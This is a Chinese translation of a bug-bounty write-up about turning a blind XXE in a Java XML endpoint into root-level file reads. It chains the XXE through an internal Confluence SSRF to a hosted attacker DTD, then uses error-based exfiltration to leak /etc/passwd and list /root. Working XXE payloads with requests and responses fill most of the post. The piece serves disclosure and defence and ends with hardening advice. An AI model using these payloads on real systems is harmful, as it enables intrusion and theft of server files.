> 原文链接: https://www.anquanke.com//post/id/167946 


# 从XXE盲注到获取root级别文件读取权限


                                阅读量   
                                **259784**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者honoki，文章来源：honoki.net
                                <br>原文地址：[https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/](https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t0130a68ea9f2250eba.png)](https://p0.ssl.qhimg.com/t0130a68ea9f2250eba.png)



## 概述

在最近的一次赏金活动中，我发现了一个XML终端，它对XXE漏洞利用尝试给出了有趣的响应。针对这一点，我没有找到太多的文档记录，只发现了在2016年由一位开发人员做出的记录。

在本文中，我将梳理我的思考过程，并逐步解决遇到的各种问题，最终我将一个中危漏洞成功提升为高危漏洞。我会着重说明我遇到的各种错误信息，并希望这些错误信息能够指导其他人走向正确的道路。

在这里，我已经将所有终端和其他可以识别身份的信息隐去，因为该漏洞是作为私人披露计划的一部分发布的，受漏洞影响的公司不希望我发布与其相关的任何信息。



## 寻找漏洞

引起我注意的，是一个使用简单的XML格式错误消息进行响应的终端，以及一个出现404错误的终端。

请求：

```
GET /interesting/ HTTP/1.1
Host: server.company.com
```

响应：

```
HTTP/1.1 404 Not Found
Server: nginx
Date: Tue, 04 Dec 2018 10:08:18 GMT
Content-Type: text/xml
Content-Length: 189
Connection: keep-alive
&lt;result&gt;
&lt;errors&gt;
&lt;error&gt;The request is invalid: The requested resource could not be found.&lt;/error&gt;
&lt;/errors&gt;
&lt;/result&gt;
```

但是，在我将请求方法更改为POST，并且添加Content-Type: application/xml标头和无效的XML主体后，得到的响应看起来更有希望了。

请求：

```
POST /interesting/ HTTP/1.1
Host: server.company.com
Content-Type: application/xml
Content-Length: 30

&lt;xml version="abc" ?&gt;
&lt;Doc/&gt;

```

响应：

```
&lt;result&gt;
&lt;errors&gt;
&lt;error&gt;The request is invalid: The request content was malformed:
XML version "abc" is not supported, only XML 1.0 is supported.&lt;/error&gt;
&lt;/errors&gt;
&lt;/result&gt;
```

假如我们发送结构合法的XML文档，会出现下面这样的情况。

请求：

```
POST /interesting/ HTTP/1.1
Host: server.company.com
Content-Type: application/xml
Content-Length: 30

&lt;?xml version="1.0" ?&gt;
&lt;Doc/&gt;

```

响应：

```
&lt;result&gt;
&lt;errors&gt;
&lt;error&gt;Authentication failed: The resource requires authentication, which was not supplied with the request&lt;/error&gt;
&lt;/errors&gt;
&lt;/result&gt;
```

需要注意，服务器显然需要凭据才能与终端进行交互。但遗憾的是，没有可参考的文档指出具体是如何提供凭据，并且我也无法在任何地方找到有效的凭据。这可能是个坏消息，因为我之前发现的一些XXE漏洞需要与终端进行某种“有效”的交互。如果没有身份验证，利用这个漏洞可能会变得更加困难。

但是不用担心，在任何情况下，我们都应该尝试包含DOCTYPE定义，从而查看是否完全阻止了外部实体的使用。因此，我进行了尝试。

请求：

```
&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM "http://59c99fu65h6mqfmhf5agv1aptgz6nv.burpcollaborator.net/x"&gt; %ext;
]&gt;
&lt;r&gt;&lt;/r&gt;
```

响应：

```
The server was not able to produce a timely response to your request.
```

我仔细观察Burp Collabourator的交互，并期待着传入的HTTP请求，但只得到了以下的内容。

[![](https://p1.ssl.qhimg.com/t0182f2adff82f08333.png)](https://p1.ssl.qhimg.com/t0182f2adff82f08333.png)

看上去，服务器解析了我的域名，但预期的HTTP请求并不存在。此外，服务器在几秒钟后出现了500超时错误。

这种情况的发生，似乎是因为部署了防火墙。我继续尝试通过其他的端口传出HTTP请求，但无济于事。我试过的所有端口都出现了超时的错误，这表明受漏洞影响的服务器可以依靠防火墙来阻止所有意外发出的流量。在这里，要给安全团队点赞。



## 继续摸着石头过河

到目前，我有一个有趣的发现，但没有任何成果。通过尝试访问本地文件、内部网络位置以及服务，我希望能够收获到一些中危的漏洞。

为了证明这种影响，我对漏洞进行了证明，并成功确认了这些文件的存在。

请求：

```
&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM "file:///etc/passwd"&gt; %ext;
]&gt;
&lt;r&gt;&lt;/r&gt;
```

响应：

```
The markup declarations contained or pointed to by the document type declaration must be well-formed.
```

这表示，该文件存在，并且可以由XML解析器打开和读取，但该文件的内容并非有效的文档类型定义（DTD），因此解析器解析失败，并产生错误。

换而言之，在这里并没有禁用外部实体的加载，但我们没有得到任何输出。在这个阶段，这似乎是一个XXE盲注的问题。

此外，我们可以假设正在运行的解析器是JAVA的SAX Parser，因为这段错误字符串似乎与Java错误类org.xml.sax.SAXParseExceptionpublicId相关。这非常有趣，因为Java在涉及到XXE漏洞时有许多独特之处，我们稍后会进行分析。

在尝试访问不存在的文件时，其响应有所不同。

请求：

```
&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM "file:///etc/passwdxxx"&gt; %ext;
]&gt;
&lt;r&gt;&lt;/r&gt;
```

响应：

```
The request is invalid: The request content was malformed:
/etc/passwdxxx (No such file or directory)
```

好的，这非常有用，但还不是最好。我们如何将这个XXE盲注漏洞转变为端口扫描程序呢？

请求：

```
&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM "http://localhost:22/"&gt; %ext;
]&gt;
&lt;r&gt;&lt;/r&gt;
```

响应：

```
The request is invalid: The request content was malformed:
Invalid Http response
```

这样一来，就意味着我们可以枚举内部服务。尽管仍然不是我想要的结果，但至少有一些收获了。这种类型的XXE盲注实际上与服务器端请求伪造（SSRF）漏洞的行为类似：攻击者可以运行内部HTTP请求，但无法读取响应。

我想知道，是否可以应用任何其他与SSRF相关的技术，以便更好地利用这个XXE盲注漏洞。我们需要检查对其他协议是否支持，包括https、gopher、ftp、jar、scp等。我尝试了一些没有结果的协议，它们产生了有用的错误消息，如下面的请求和响应所示。

请求：

```
&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE root [ &lt;!ENTITY % ext SYSTEM "gopher://localhost/"&gt; %ext; ]&gt;
&lt;r&gt;&lt;/r&gt;
```

响应：

```
The request is invalid: The request content was malformed:
unknown protocol: gopher
```

这很有趣，因为它将用户提供的协议打印到错误消息之中。我们记录下这种利用方式，留待以后使用。

通过SSRF盲注，我们看看是否可以访问任何有意义的内部Web应用程序。由于我进行漏洞挖掘的公司似乎与大量开发人员合作，在其GitHub中出现了大量对x.company.internal格式的内部主机的引用，所以我发现了一些看起来很有希望的内部资源，例如：



wiki.company.internal

jira.company.internal

confluence.company.internal

在此前，我们发现有防火墙阻止了流量的传出，我想验证内部流量是否也被阻止，或者内部网络是否更受信任。

请求：

```
&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM "http://wiki.company.internal/"&gt; %ext;
]&gt;
&lt;r&gt;&lt;/r&gt;
```

响应：

```
The markup declarations contained or pointed to by the document type declaration must be well-formed.
```

我们之前见过相同的错误消息，这表明所请求的资源已被读取，但格式不正确。这也意味着，内部的网络流量是被允许的，我们的内部请求已经成功！

现在，我们利用XXE盲注漏洞，可以向许多内部Web应用程序发出请求，枚举文件系统上存在的文件，并枚举在所有内部主机上运行的服务。我在旅行的路上，报告了这一漏洞，并思考进一步的可能性。



## 深入挖掘

在旅行回来后，我的心情也焕然一新，于是决心深入挖掘这个漏洞。具体来说，我已经意识到未经过滤的内部网络流量可能会被滥用，以将流量发送到外部，从而防止在内部网络上找到类似代理的主机。

通常，在没有任何形式的反馈的情况下，寻找Web应用程序上的漏洞几乎是不可能的。幸运的是，在Jira中有一个已知的SSRF漏洞，在许多文章中已经给出了Write-up。

我立刻针对此前发现的内部Jira服务器，测试这个漏洞是否存在。

请求：

```
&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM "https://jira.company.internal/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x"&gt; %ext;
]&gt;
&lt;r&gt;&lt;/r&gt;
```

响应：

```
The request is invalid: The request content was malformed:
sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
```

这样看来，如果SSL验证中的任何内容出现错误，HTTPS流量也会传输失败。幸运的是，Jira默认在TCP/8080端口上作为普通HTTP服务运行。所以，让我们再试一次。

请求：

```
&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM "http://jira.company.internal:8080/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x"&gt; %ext;
]&gt;
&lt;r&gt;&lt;/r&gt;
```

响应：

```
The request is invalid: The request content was malformed:
http://jira.company.internal:8080/plugins/servlet/oauth/users/icon-uri
```

我再次检查了我的Burp Collaborator交互，但结果表明Jira可能已经修复了漏洞，或者禁用了易受攻击的插件。最后，在我疯狂寻找已知SSRF漏洞无果后，我决定尝试针对Confluence（默认情况下在8090端口）利用与Jira相同的漏洞。

请求：

```
&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x"&gt; %ext;
]&gt;
&lt;r&gt;&lt;/r&gt;
```

响应：

```
The request is invalid: The request content was malformed:
The markup declarations contained or pointed to by the document type declaration must be well-formed.
```

什么？！

[![](https://p5.ssl.qhimg.com/t0119c809c7909168ea.png)](https://p5.ssl.qhimg.com/t0119c809c7909168ea.png)

漏洞存在！我们成功通过内部存在漏洞的Confluence传出互联网流量，从而避免存在漏洞的服务器的防火墙限制。这意味着，我们现在可以尝试使用XXE的经典方法。首先，我们在攻击者的服务器上托管一个evil.xml文件，其中包含以下内容，希望以此能触发带有更多内容的错误消息：

```
&lt;!ENTITY % file SYSTEM "file:///"&gt;
&lt;!ENTITY % ent "&lt;!ENTITY data SYSTEM '%file;'&gt;"&gt;
```

让我们更详细地看一下这些参数实体的定义：
1. 将外部引用的内容（在示例中是系统的根目录）加载到变量%file;中。
1. 定义变量%ent;，二者结合在一起，编译第三个实体的定义。
1. 尝试访问位置%file;的资源（可能指向任何地方），并将该位置的任何内容加载到实体数据中。
我们在这里引入的第三个定义是失败的，因为%file;的内容不会指向有效的资源位置，而是包含完整目录的内容。

现在，使用Confluence“代理”指向我们的evil文件，并确保%ent;和%data;参数可以访问并触发目录访问。

请求：

```
&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml"&gt;
%ext;
%ent;
]&gt;
&lt;r&gt;&amp;data;&lt;/r&gt;
```

响应：

```
no protocol: bin
boot
dev
etc
home
[...]
```

不错，现在列出了服务器根目录所包含的所有文件。

在这里，展现了另一种从服务器返回基于错误的输出结果的方法，也就是通过指定“缺少”的协议，而不是我们之前看到的无效协议。

这可以帮助我们解决阅读包含冒号的文件的问题，例如，使用上述方法读取/etc/passwd会出现如下错误。

请求：

```
&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml"&gt;
%ext;
%ent;
]&gt;
&lt;r&gt;&amp;data;&lt;/r&gt;
```

响应：

```
unknown protocol: root
```

换句话说，我们可以读取文件，直到第一次出现冒号。要绕过此问题，并强制在错误消息中显示完整文件内容的方法是，在文件内容之前添加冒号。这样将导致“无协议”错误，因为第一个冒号之前的字段为空，也就是未定义。托管的Payload现在修改如下：

```
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % ent "&lt;!ENTITY data SYSTEM ':%file;'&gt;"&gt;
```

需要注意%file;之前添加的冒号。现在重复我们的代理攻击，会产生以下结果。

请求：

```
&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml"&gt;
%ext;
%ent;
]&gt;
&lt;r&gt;&amp;data;&lt;/r&gt;
```

响应：

```
no protocol: :root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
[…]
```

终于！最后，为了造成最大化的影响，我们考虑到Java在访问目录时会返回目录列表，而不是文件，因此可以通过尝试列出/root目录中的文件，来对root权限进行非入侵式检查：

```
&lt;!ENTITY % file SYSTEM "file:///root"&gt;
&lt;!ENTITY % ent "&lt;!ENTITY data SYSTEM ':%file;'&gt;"&gt;
```

请求：

```
&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml"&gt;
%ext;
%ent;
]&gt;
&lt;r&gt;&amp;data;&lt;/r&gt;
```

响应：

```
no protocol: :.bash_history
.bash_logout
.bash_profile
.bashrc
.pki
.ssh
[...]
```

就是这样，我们看起来很幸运。通过滥用不充分的网络分段、未修复的内部应用程序服务器、具有额外特权的Web服务器和过于冗长的错误消息传递信息泄露漏洞，成功将XXE盲注漏洞提升为root级别文件读取漏洞。



## 经验总结

### <a class="reference-link" name="%E7%BA%A2%E6%96%B9"></a>红方
1. 如果事情看起来很奇怪，应该继续进行漏洞挖掘。
1. Java SAX Parser对URL的处理方式，允许攻击者采用一些新颖的方式来提取信息。现代Java版本不允许将多行文件作为外部HTTP请求的路径（即hxxp[://]attacker[.]org/?&amp;file; ）进行渗透，但在错误消息中可以获得多行响应，甚至是在URL的协议中。
### <a class="reference-link" name="%E8%93%9D%E6%96%B9"></a>蓝方
1. 确保内部服务器也像公网服务器一样，得到及时的修复。
1. 不要将内部网络视为一个受信任的安全区域，而是要进行适当的网络分段。
1. 将详细的错误消息写入错误日志中，不能仅记录HTTP响应。
1. 依靠身份验证，不一定能缓解像XXE这样的低级问题。


## 时间线

2018年11月26日 发现XML终端问题

2018年11月28日 将其报告为XXE盲注问题，可以枚举文件、目录、内部网络位置和开放端口

2018年12月3日 发现存在漏洞的内部Confluence服务器，在提交的PoC中说明了提升为root权限实现访问的能力

2018年12月4日 漏洞修复，并获得赏金

2018年12月6日 申请发表Write-Up

2018年12月12日 获得允许
